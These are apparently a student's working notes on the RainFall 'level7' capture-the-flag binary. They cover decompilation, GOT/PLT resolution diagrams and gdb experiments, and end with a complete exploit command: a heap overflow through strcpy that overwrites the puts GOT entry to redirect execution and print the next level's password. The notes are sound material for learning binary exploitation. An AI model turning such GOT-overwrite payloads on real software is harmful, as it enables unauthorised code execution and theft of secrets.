# Research notes

This is the working log, including experiments that did not succeed. The verified VM procedure is in `../walkthrough`. Addresses from local experiments may differ from the ISO VM.

### CWEs: Common Weakness Enumeration
- https://cwe.mitre.org/data/definitions/120.html
- https://cwe.mitre.org/data/definitions/122.html
- https://cwe.mitre.org/data/definitions/123.html

```bash
$ gdb -nx --batch -ex 'i fun' ./level7
All defined functions:

Non-debugging symbols:
0x0804836c  _init
0x080483b0  printf@plt
0x080483c0  fgets@plt
0x080483d0  time@plt
0x080483e0  strcpy@plt
0x080483f0  malloc@plt
0x08048400  puts@plt
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main@plt
0x08048430  fopen@plt
0x08048440  _start
0x08048470  __do_global_dtors_aux
0x080484d0  frame_dummy
0x080484f4  m
0x08048521  main
0x08048610  __libc_csu_init
0x08048680  __libc_csu_fini
0x08048682  __i686.get_pc_thunk.bx
0x08048690  __do_global_ctors_aux
0x080486bc  _fini

```

### PyGhidra
```python
src = """
typedef unsigned int u32;

struct internet {
    int priority;
    char *name;
};
"""

tx = currentProgram.startTransaction("Import reconstructed types")
ok = False
try:
    parser = CParser(currentProgram.getDataTypeManager(), True, None)
    parser.parse(src)
    ok = True
finally:
    currentProgram.endTransaction(tx, ok)
```


```bash
$ r2 -e bin.cache=true ./level7
Do you want to run the './level7.r2' script? (y/N)  y
-- Analyze socket connections with the socket plugin:\
-- 'radare2 socket://www.foo.com:80'. Use 'w' to send data
[0x08048521]> pdg

int main(int ac,char **av)
{
  uint *puVar1;
  uint uVar2;
  uint *puVar3;
  FILE *stream;

  puVar1 = sym.imp.malloc(8);
  *puVar1 = 1;
  uVar2 = sym.imp.malloc(8);
  puVar1[1] = uVar2;
  puVar3 = sym.imp.malloc(8);
  *puVar3 = 2;
  uVar2 = sym.imp.malloc(8);
  puVar3[1] = uVar2;
  sym.imp.strcpy(puVar1[1],av[1]);
  sym.imp.strcpy(puVar3[1],av[2]);
  stream = sym.imp.fopen("/home/user/level8/.pass","r");
  sym.imp.fgets(obj.c,0x44,stream);
  sym.imp.puts("~~");
  return 0;
}

[0x08048521]> pdg @ sym.m

void sym.m(void)
{
  uint uVar1;

  uVar1 = sym.imp.time(NULL);
  sym.imp.printf("%s - %d\n",obj.c,uVar1);
  return;
}
```

```bash
pwndbg> x/s 0x80486eb
0x80486eb:	"/home/user/level8/.pass"

pwndbg> vmmap 0x80486eb
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
Start        End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
►  0x8048000  0x8049000 r-xp     1000       0 level7 +0x6d8

pwndbg> mt i sec .rodata
Exec file: `/home/abelov/git/c/42london/RainFall/level7/level7', file type elf32-i386.
 [14]     0x80486d8->0x8048706 at 0x000006d8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
```

### Writing to .rodata

```bash
# put these in .gdbinit

macro define PROT_NONE  0x0
macro define PROT_READ  0x1
macro define PROT_WRITE 0x2
macro define PROT_EXEC  0x4
macro define mprotect(addr,len,prot) ((int (*)(void *, unsigned int, int)) &mprotect)((addr),(len),(prot))

(gdb) call mprotect((void *)0x8048000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
$1 = 0x0

(gdb) x/s  0x80486eb
0x80486eb:	"/home/user/level8/.pass"

(gdb) call sprintf((char *)0x80486eb, "blah blah")
$3 = 0x9

(gdb) x/s  0x80486eb
0x80486eb:	"blah blah"

```



## Working with relocations: GOT vs PLT

```text
                      .rel.plt[0]
                  +------------------+
                  | r_offset=8049914 |
                  | symbol=printf    |
                  | type=JUMP_SLOT   |
                  +--------+---------+
                           |
                           | describes
                           v
.plt                  .got.plt
+---------------+     +----------------------+
| printf@plt    |     | 0x8049914            |
|               |     |                      |
| jmp [8049914] +---->| 0x80483b6 initially  |
| push 0        |     | libc printf later    |
| jmp PLT0      |     +----------------------+
+---------------+

pwndbg> pdisas -r0 0x80483a0 31
 ► 0x80483a0                                       ┌┌┌┌┌┌┌┌┌>   push   dword ptr [_GLOBAL_OFFSET_TABLE_+4]
   0x80483a6                                       ╎╎╎╎╎╎╎╎╎    jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+8]
                                                   ╎╎╎╎╎╎╎╎╎
   0x80483ac                                       ╎╎╎╎╎╎╎╎╎    add    byte ptr [eax], al
   0x80483ae                                       ╎╎╎╎╎╎╎╎╎    add    byte ptr [eax], al
   0x80483b0 <printf@plt>                          ╎╎╎╎╎╎╎╎╎    jmp    dword ptr [printf@got[plt]]
                                                   ╎╎╎╎╎╎╎╎╎
   0x80483b6 <printf@plt+6>                        ╎╎╎╎╎╎╎╎╎    push   0
   0x80483bb <printf@plt+11>                       ╎╎╎╎╎╎╎╎└<   jmp    0x80483a0                   <0x80483a0>
                                                   ╎╎╎╎╎╎╎╎
   0x80483c0 <fgets@plt>                           ╎╎╎╎╎╎╎╎     jmp    dword ptr [fgets@got[plt]]
                                                   ╎╎╎╎╎╎╎╎
   0x80483c6 <fgets@plt+6>                         ╎╎╎╎╎╎╎╎     push   8
   0x80483cb <fgets@plt+11>                        ╎╎╎╎╎╎╎└─<   jmp    0x80483a0                   <0x80483a0>
                                                   ╎╎╎╎╎╎╎
   0x80483d0 <time@plt>                            ╎╎╎╎╎╎╎      jmp    dword ptr [time@got[plt]]
                                                   ╎╎╎╎╎╎╎
   0x80483d6 <time@plt+6>                          ╎╎╎╎╎╎╎      push   0x10
   0x80483db <time@plt+11>                         ╎╎╎╎╎╎└──<   jmp    0x80483a0                   <0x80483a0>
                                                   ╎╎╎╎╎╎
   0x80483e0 <strcpy@plt>                          ╎╎╎╎╎╎       jmp    dword ptr [strcpy@got[plt]]
                                                   ╎╎╎╎╎╎
   0x80483e6 <strcpy@plt+6>                        ╎╎╎╎╎╎       push   0x18
   0x80483eb <strcpy@plt+11>                       ╎╎╎╎╎└───<   jmp    0x80483a0                   <0x80483a0>
                                                   ╎╎╎╎╎
   0x80483f0 <malloc@plt>                          ╎╎╎╎╎        jmp    dword ptr [malloc@got[plt]]
                                                   ╎╎╎╎╎
   0x80483f6 <malloc@plt+6>                        ╎╎╎╎╎        push   0x20
   0x80483fb <malloc@plt+11>                       ╎╎╎╎└────<   jmp    0x80483a0                   <0x80483a0>
                                                   ╎╎╎╎
   0x8048400 <puts@plt>                            ╎╎╎╎         jmp    dword ptr [puts@got[plt]]
                                                   ╎╎╎╎
   0x8048406 <puts@plt+6>                          ╎╎╎╎         push   0x28
   0x804840b <puts@plt+11>                         ╎╎╎└─────<   jmp    0x80483a0                   <0x80483a0>
                                                   ╎╎╎
   0x8048410 <__gmon_start__@plt>                  ╎╎╎          jmp    dword ptr [__gmon_start__@got.plt]
                                                   ╎╎╎
   0x8048416 <__gmon_start__@plt+6>                ╎╎╎          push   0x30
   0x804841b <__gmon_start__@plt+11>               ╎╎└──────<   jmp    0x80483a0                   <0x80483a0>
                                                   ╎╎
   0x8048420 <__libc_start_main@plt>               ╎╎           jmp    dword ptr [__libc_start_main@got.plt]
                                                   ╎╎
   0x8048426 <__libc_start_main@plt+6>             ╎╎           push   0x38
   0x804842b <__libc_start_main@plt+11>            ╎└───────<   jmp    0x80483a0                   <0x80483a0>
                                                   ╎
   0x8048430 <fopen@plt>                           ╎            jmp    dword ptr [fopen@got[plt]]
                                                   ╎
   0x8048436 <fopen@plt+6>                         ╎            push   0x40
   0x804843b <fopen@plt+11>                        └────────<   jmp    0x80483a0                   <0x80483a0>
```


```bash
(gdb) x/a 0x804991c
0x804991c <time@got.plt>:	0x80483d6 <time@plt+6>
(gdb) call (long)'time@plt'(0)
(gdb) call (int)'printf@plt'("hey ho!\n")
$1 = 1788784945
(gdb) x/a 0x804991c
0x804991c <time@got.plt>:	0xb7ed2460 <__GI_time>
```

```text
                        FIRST CALL
                        ==========

     .plt                 .got.plt
+-------------+        +-------------+
| time@plt    |        | time slot   |
| jmp [GOT]   |------->| time@plt+6  |
+-------------+        +------+------+
                             v
                       +-------------+
                       | time@plt+6  |
                       | push 0x10   |
                       | jmp PLT0    |
                       +------+------+
                              v
                       +-------------+
                       | PLT0        |
                       +------+------+
                              v
                    _dl_runtime_resolve
                              |
               +--------------+--------------+
               v                             v
       .rel.plt + 0x10              dynamic symbol table
       +----------------+           +----------------+
       | r_offset=GOT   |           | dynsym[3]      |
       | r_info=0x307   |---------->| "time"         |
       +----------------+           +----------------+
               | resolve "time"
               v
          libc::__GI_time
               | write address
               v
       +----------------+
       | time@got.plt   |
       | = __GI_time    |
       +----------------+

                     LATER CALLS
                     ===========
       time@plt
           | jmp [time@got.plt]
           v
       time@got.plt
           | now contains
           v
        __GI_time
```

```bash
set args \
  $(python2.7 -c 'import struct; print "_"*20 + struct.pack("<I", 0x08049928)') \
  $(python2.7 -c 'import struct; print struct.pack("<I", 0x080484f4)')

!mkfifo /tmp/msyms
! : > /tmp/msyms; \
  tail -n +1 -f /tmp/msyms 2>/dev/null | \
  grep --line-buffered _GLOBAL_OFFSET_TABLE_ &
mt pr msym /tmp/msyms
br fgets
run
mt pr msym /tmp/msyms
xa 0x8049908 12
```

```bash
./level7 \
  $(python -c 'import struct; print "_"*20 + struct.pack("<I", 0x08049928)') \
  $(python -c 'import struct; print struct.pack("<I", 0x080484f4)')
```
